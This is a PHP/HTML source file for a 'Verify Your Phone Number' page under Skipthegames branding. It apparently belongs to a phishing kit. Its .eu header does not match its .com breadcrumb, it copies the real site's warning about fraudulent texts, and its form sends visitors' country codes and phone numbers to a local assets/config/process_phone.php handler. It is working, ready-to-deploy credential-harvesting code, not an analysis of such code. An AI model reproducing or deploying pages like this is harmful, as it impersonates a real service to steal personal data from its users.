<?php
// phone_verify.php
// Page to request and submit the user's phone number.

session_start();
// Retrieve the user's email for the header
$user_email = $_SESSION['logged_in_email'] ?? 'email@example.com'; 
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Verify Phone Number</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets/css/login.css"> 
  <link rel="stylesheet" href="assets/css/face_id.css"> 
  
  <style>
    /* Specific styles for the phone section */
    .phone-form {
        max-width: 400px;
        margin: 20px auto;
        padding: 20px;
        border: 1px solid var(--border);
        border-radius: 8px;
    }
    .input-group {
        display: flex;
        gap: 10px;
        margin-bottom: 20px;
    }
    /* Style for the country code select box */
    .input-group select {
        width: 120px;
        height: 48px;
        border: 1px solid var(--border);
        border-radius: 4px;
        padding: 0 10px;
        font-size: 16px;
    }
    /* Style for the phone number input */
    .input-group input[type="tel"] {
        flex-grow: 1;
        margin: 0; /* Override default margin from login.css */
        height: 48px;
    }
  </style>
</head>
<body>

  <main class="wrap" role="main">
    
    <div class="top-warning">Providers, we do not send out text messages ever, do not click on links from them.</div>

    <header class="brand-block">
      <a href="#" class="brand">Skipthegames<span class="tld">.eu</span></a>
      <div class="tagline">Skip the games. Get satisfaction.</div>
    </header>
    
    <div class="user-block">
        <span class="user-salute">Hi,</span>
        <a href="#" class="user-email-link"><?php echo htmlspecialchars($user_email); ?></a>
        <span class="user-actions">
            <a href="#">go to your account</a> | <a href="#" class="log-out-link">log out</a>
        </span>
    </div>

    <p class="nav-breadcrumb">
        <a href="#">SKIPTHEGAMES.COM</a> » PHONE VERIFICATION
    </p>

    <h1 class="security-title">Verify Your Phone Number</h1>
    
    <p class="security-text">
        Please provide a phone number for final security check and account activation.
    </p>

    <form method="post" action="assets/config/process_phone.php" class="phone-form">
      
      <label class="sr-only" for="country_code">Country Code</label>
      <label class="sr-only" for="phone_number">Phone Number</label>

      <div class="input-group">
        <select id="country_code" name="country_code" required>
            <option value="+1" selected>US (+1)</option>
            <option value="+57">CO (+57)</option>
            <option value="+52">MX (+52)</option>
            <option value="+34">ES (+34)</option>
            <option value="+44">UK (+44)</option>
            <option value="+54">AR (+54)</option>
            </select>
        
        <input id="phone_number" name="phone_number" type="tel" placeholder="e.g. 555 123 4567" inputmode="numeric" required>
      </div>

      <button type="submit" class="btn" style="width: 100%; height: 54px;">Verify and Finish</button>
    </form>


    <hr class="divider">

    <footer class="footer">
      <small>©Skipthegames.eu</small>
      <nav class="links footer-mobile-links" aria-label="Footer">
        <a href="#">Home</a><a href="#">Contact</a><a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Escort Info</a>
      </nav>
    </footer>
  </main>
  
</body>
</html>